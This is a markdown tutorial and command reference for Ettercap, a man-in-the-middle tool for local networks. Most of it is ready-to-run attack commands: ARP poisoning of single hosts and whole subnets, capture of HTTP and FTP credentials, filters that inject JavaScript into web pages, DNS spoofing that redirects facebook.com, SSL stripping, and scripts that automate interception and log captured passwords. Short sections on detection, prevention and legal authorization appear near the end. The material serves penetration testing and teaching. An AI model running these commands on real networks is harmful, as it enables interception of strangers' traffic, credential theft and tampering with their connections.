# Ettercap

## Introduction

## What is Ettercap?

Ettercap is a comprehensive network security tool for man-in-the-middle (MITM) attacks on LAN. It features sniffing of live connections, content filtering, and supports active and passive dissection of many protocols. It's used for network analysis and security auditing.

## Why Ettercap?

- Comprehensive MITM attack capabilities
- Protocol analysis and packet manipulation
- Active and passive network sniffing
- Plugin architecture for extensibility
- Both GUI and CLI interfaces
- Cross-platform support

## Learning Path

1. Understand MITM attack concepts and ethics
2. Learn network protocols (ARP, TCP/IP, DNS)
3. Practice in isolated lab environment
4. Master ARP poisoning techniques
5. Explore advanced filtering and plugins

## User Guide

## Prerequisites

- Linux/Unix system (recommended)
- Root/administrator privileges
- Isolated network for testing
- Basic understanding of networking
- **Authorization**: Only use on networks you own or have explicit permission to test

Verify installation:

```bash
ettercap --version
```

## Installation

### Ubuntu/Debian

```bash
sudo apt update
sudo apt install ettercap-common ettercap-graphical
```

### RHEL/CentOS/Fedora

```bash
sudo yum install ettercap
# Or
sudo dnf install ettercap
```

### Arch Linux

```bash
sudo pacman -S ettercap
```

### macOS

```bash
brew install ettercap
```

### Compile from source

```bash
# Install dependencies (Debian/Ubuntu)
sudo apt install debhelper cmake bison flex libgtk-3-dev libnet1-dev \
    libpcap-dev libpcre3-dev libssl-dev libcurl4-openssl-dev \
    ghostscript libtool automake

# Clone and build
git clone https://github.com/Ettercap/ettercap.git
cd ettercap
mkdir build
cd build
cmake ..
make
sudo make install
```

## Basic Usage

### GUI Mode

```bash
# Launch GUI
sudo ettercap -G

# Or
sudo ettercap --gtk
```

### Text Mode (ncurses)

```bash
sudo ettercap -C
# Or
sudo ettercap --curses
```

### Command Line Mode

```bash
# Text-only mode
sudo ettercap -T

# Quiet mode
sudo ettercap -q
```

## Network Interface Setup

### List available interfaces

```bash
sudo ettercap -I
# Or
sudo ettercap --iface-list
```

### Specify interface

```bash
# Use specific interface
sudo ettercap -i eth0 -T

# Bridge mode (two interfaces)
sudo ettercap -i eth0 -i eth1 -T
```

## Host Discovery

### Scan for hosts

```bash
# GUI: Sniff > Unified sniffing > Select interface
# Then: Hosts > Scan for hosts

# CLI: Scan and list hosts
sudo ettercap -T -i eth0 -P list_hosts ///
```

### View host list

```bash
# In GUI: Hosts > Hosts list
# Shows IP addresses and MAC addresses
```

## ARP Poisoning (MITM)

### Basic ARP poisoning

```bash
# Poison between gateway and target
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//

# Explanation:
# -M arp:remote = MITM with ARP poisoning
# /192.168.1.1// = Gateway
# /192.168.1.100// = Target
```

### Poison entire subnet

```bash
# Intercept all traffic in subnet
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.0-255// //

# Gateway to all hosts
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.1// /192.168.1.0-255//
```

### One-way poisoning

```bash
# Poison only target (not gateway)
sudo ettercap -T -i eth0 -M arp:oneway /192.168.1.1// /192.168.1.100//
```

## Target Selection

### Target syntax

```bash
# Format: /IP_ADDRESS/PORT/
# Examples:

# All hosts
///

# Specific IP
/192.168.1.100//

# IP range
/192.168.1.1-50//

# Subnet
/192.168.1.0-255//

# Specific port
/192.168.1.100/80/

# Multiple ports
/192.168.1.100/80,443,8080/

# Port range
/192.168.1.100/1-1024/
```

### Multiple targets

```bash
# Two target groups
sudo ettercap -T -M arp /TARGET1// /TARGET2//

# Example: Gateway and specific host
sudo ettercap -T -M arp /192.168.1.1// /192.168.1.100//
```

## Protocol Dissection

### Available dissectors

```bash
# List available dissectors
sudo ettercap -D

# Common protocols:
# - HTTP
# - FTP
# - SMTP
# - POP
# - IMAP
# - SSH (version banner only)
# - MYSQL
# - PostgreSQL
# - VNC
# - RDP (partial)
```

### Capture credentials

```bash
# Start sniffing with protocol dissection
sudo ettercap -T -i eth0 -M arp /192.168.1.1// /192.168.1.0-255// -q

# Credentials will appear in output as they're captured
```

## Filtering

### Create filter

```bash
# Create filter file (example: drop_http.ecf)
cat > drop_http.ecf << 'EOF'
if (ip.proto == TCP && tcp.dst == 80) {
   msg("HTTP packet dropped\n");
   drop();
   kill();
}
EOF
```

### Compile filter

```bash
# Compile .ecf to .ef
sudo etterfilter drop_http.ecf -o drop_http.ef
```

### Use filter

```bash
# Apply filter during attack
sudo ettercap -T -i eth0 -M arp -F drop_http.ef /192.168.1.1// /192.168.1.100//
```

### Filter examples

**Replace text in HTTP**

```
if (ip.proto == TCP && tcp.dst == 80) {
   if (search(DATA.data, "Accept-Encoding")) {
      replace("Accept-Encoding", "Accept-Nothing!");
      msg("Removed Accept-Encoding\n");
   }
}
```

**Inject JavaScript**

```
if (ip.proto == TCP && tcp.dst == 80) {
   if (search(DATA.data, "<head>")) {
      replace("<head>", "<head><script>alert('Hacked');</script>");
      msg("Injected JavaScript\n");
   }
}
```

**Drop SSH connections**

```
if (ip.proto == TCP && tcp.dst == 22) {
   msg("SSH connection dropped\n");
   drop();
   kill();
}
```

## Plugins

### List plugins

```bash
# List available plugins
sudo ettercap -P list

# Common plugins:
# - autoadd: Automatically add victims to target list
# - chk_poison: Check if poisoning was successful
# - dns_spoof: DNS spoofing
# - find_conn: Find connections
# - find_ip: Find IP address
# - gre_relay: GRE tunnel relay
# - isolate: Isolate host from network
```

### Use plugin

```bash
# Use single plugin
sudo ettercap -T -i eth0 -M arp -P autoadd ///

# Multiple plugins
sudo ettercap -T -i eth0 -M arp -P "autoadd,chk_poison" ///
```

### DNS Spoofing

```bash
# Edit DNS spoofing file
sudo nano /etc/ettercap/etter.dns

# Add entries (example)
# Redirect facebook.com to local IP
facebook.com A 192.168.1.50
*.facebook.com A 192.168.1.50
www.facebook.com A 192.168.1.50

# Start DNS spoofing
sudo ettercap -T -i eth0 -M arp -P dns_spoof /192.168.1.1// /192.168.1.100//
```

## SSL/TLS MITM

### SSL stripping

```bash
# Requires sslstrip or similar tool
# Ettercap can downgrade HTTPS to HTTP

# 1. Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# 2. Redirect traffic to sslstrip
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# 3. Run sslstrip
sslstrip -l 8080

# 4. Run ettercap
sudo ettercap -T -i eth0 -M arp /192.168.1.1// /192.168.1.100//
```

### SSL certificate replacement

```bash
# Configure ettercap to use custom certificates
# Edit /etc/ettercap/etter.conf

# Set paths:
# ec_uid = 65534
# ec_gid = 65534
# redir_command_on = "iptables -t nat -A PREROUTING ..."
# redir_command_off = "iptables -t nat -D PREROUTING ..."

# Generate custom certificates (if needed)
```

## Advanced Options

### Logging

```bash
# Log to file
sudo ettercap -T -i eth0 -M arp -L /tmp/ettercap_log ///

# Creates:
# /tmp/ettercap_log.ecp - Compiled format
# /tmp/ettercap_log.eci - Info file

# Read log later
sudo ettercap -T -r /tmp/ettercap_log.ecp
```

### Packet capture

```bash
# Save packets in PCAP format
sudo ettercap -T -i eth0 -M arp -w /tmp/capture.pcap ///

# Analyze with Wireshark later
wireshark /tmp/capture.pcap
```

### Quiet mode

```bash
# Suppress output
sudo ettercap -T -i eth0 -M arp -q ///
```

### Verbosity

```bash
# Increase verbosity
sudo ettercap -T -i eth0 -M arp -v ///

# Decrease verbosity
sudo ettercap -T -i eth0 -M arp -q ///
```

## Configuration

### Main configuration file

```bash
# Edit configuration
sudo nano /etc/ettercap/etter.conf

# Important settings:
# - ec_uid/ec_gid: User/group to run as
# - ip_forwarding: Enable IP forwarding
# - Remote: Enable remote MITM
# - Gateway: Default gateway
```

### Common configurations

```
[privs]
ec_uid = 65534
ec_gid = 65534

[mitm]
# Enable IP forwarding
ip_forwarding = yes

# ARP storm threshold
arp_storm_threshold = 1000

[connections]
connection_timeout = 300
connection_idle = 300

[stats]
connections = yes
stats_half_duplex = yes
```

## Common Use Cases

### Capture HTTP credentials

```bash
# Start MITM attack
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100// -q

# Look for HTTP POST requests with credentials
# Output will show USER and PASS
```

### Sniff FTP login

```bash
# MITM with logging
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100// -L ftp_capture

# FTP credentials will be dissected and logged
```

### Test network security

```bash
# Perform ARP poisoning
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//

# Monitor for:
# - Unencrypted credentials
# - Sensitive data transmission
# - Protocol vulnerabilities
```

### Isolate malicious host

```bash
# Use isolate plugin
sudo ettercap -T -i eth0 -P isolate /192.168.1.100//

# Host will be isolated from network
```

### DNS spoofing attack

```bash
# Configure DNS records
sudo nano /etc/ettercap/etter.dns
# Add: malicious.com A 192.168.1.50

# Start DNS spoofing
sudo ettercap -T -i eth0 -M arp -P dns_spoof /192.168.1.1// /192.168.1.100//
```

## Scripting and Automation

### Automated MITM script

```bash
#!/bin/bash
# Automated Ettercap MITM attack

INTERFACE="eth0"
GATEWAY="192.168.1.1"
TARGET="192.168.1.100"
LOGFILE="/tmp/ettercap_$(date +%Y%m%d_%H%M%S)"

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start attack
ettercap -T -i $INTERFACE \
         -M arp:remote /$GATEWAY// /$TARGET// \
         -L $LOGFILE \
         -q

echo "Log saved to $LOGFILE"
```

### Monitor for specific credentials

```bash
#!/bin/bash
# Monitor ettercap output for credentials

sudo ettercap -T -i eth0 -M arp /192.168.1.1// /192.168.1.0-255// -q | \
while read line; do
    if echo "$line" | grep -qE "USER|PASS"; then
        echo "[$(date)] $line" >> /var/log/credentials.log
        notify-send "Credential Captured" "$line"
    fi
done
```

## Detection and Prevention

### Detect ARP poisoning

```bash
# Monitor ARP table changes
watch -n 1 arp -a

# Check for duplicate IPs with different MACs
arp-scan --interface=eth0 --localnet

# Use arpwatch for monitoring
sudo arpwatch -i eth0
```

### Prevent ARP poisoning

```bash
# Static ARP entries
sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff

# Use port security on switches
# Configure switch to limit MAC addresses per port

# Enable Dynamic ARP Inspection (DAI) on switches

# Use encrypted protocols (HTTPS, SSH, VPN)
```

## Troubleshooting

### Forwarding not working

```bash
# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Make permanent
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

### No targets found

```bash
# Check interface
ip addr show

# Verify on correct network
sudo ettercap -I

# Scan manually
sudo nmap -sn 192.168.1.0/24
```

### Permission denied

```bash
# Run as root
sudo ettercap -T -i eth0 ///

# Check interface is up
sudo ip link set eth0 up
```

### Plugin not working

```bash
# Check plugin path
ls /usr/share/ettercap/

# Check plugin loaded
sudo ettercap -P list | grep plugin_name
```

## Security and Ethics

### ⚠️ Legal Warning

- **Only use on networks you own or have explicit permission to test**
- Unauthorized network interception is **illegal** in most jurisdictions
- Violating privacy laws can result in criminal charges
- Always obtain written authorization before security testing

### Responsible use

```bash
# Document all testing
# - Date and time
# - Authorization
# - Scope of testing
# - Findings

# Use in isolated lab environments
# - Virtual networks
# - Test VLANs
# - Air-gapped systems

# Follow responsible disclosure
# - Report vulnerabilities to vendors
# - Allow time for patches
# - Coordinate public disclosure
```

## Quick Reference

### Essential options

```bash
-T              # Text mode
-C              # Curses mode (ncurses)
-G              # GTK GUI
-i <iface>      # Network interface
-M <method>     # MITM method (arp, icmp, dhcp)
-P <plugin>     # Plugin to use
-F <filter>     # Filter file
-L <logfile>    # Log file prefix
-w <pcapfile>   # PCAP output
-q              # Quiet mode
-v              # Verbose
```

### Target syntax

```bash
///                 # All hosts
/IP//               # Specific IP
/IP1-IP2//          # IP range
/IP/PORT/           # Specific port
/IP/PORT1,PORT2/    # Multiple ports
```

### MITM methods

```bash
arp:remote      # ARP poisoning (bidirectional)
arp:oneway      # ARP poisoning (one direction)
icmp:redirect   # ICMP redirect
dhcp:spoofing   # DHCP spoofing
```

## Real-World Examples

### Security audit of corporate network

```bash
# With proper authorization
sudo ettercap -T -i eth0 -M arp /GATEWAY// /SUBNET// -L audit_log -q

# Check for:
# - Unencrypted protocols
# - Weak authentication
# - Sensitive data exposure
```

### Test WAF bypass

```bash
# Create filter to modify requests
# Compile and apply during testing
sudo ettercap -T -i eth0 -M arp -F waf_bypass.ef /TARGET//
```

### Demonstrate security risks

```bash
# In controlled environment, show:
# - HTTP credential capture
# - DNS spoofing
# - Session hijacking

# Use for security awareness training
```

## Resources

- [Ettercap official site](https://www.ettercap-project.org/)
- [Ettercap GitHub](https://github.com/Ettercap/ettercap)
- [Ettercap documentation](https://www.ettercap-project.org/documentation.html)
- [Man page](https://linux.die.net/man/8/ettercap)

## Next Steps

- Learn Wireshark for detailed packet analysis
- Study network security fundamentals
- Explore other MITM tools (mitmproxy, bettercap)
- Learn about network encryption (TLS/SSL, VPN)
- Practice in legal hacking labs (HackTheBox, TryHackMe)
- Study ethical hacking and obtain certifications (CEH, OSCP)
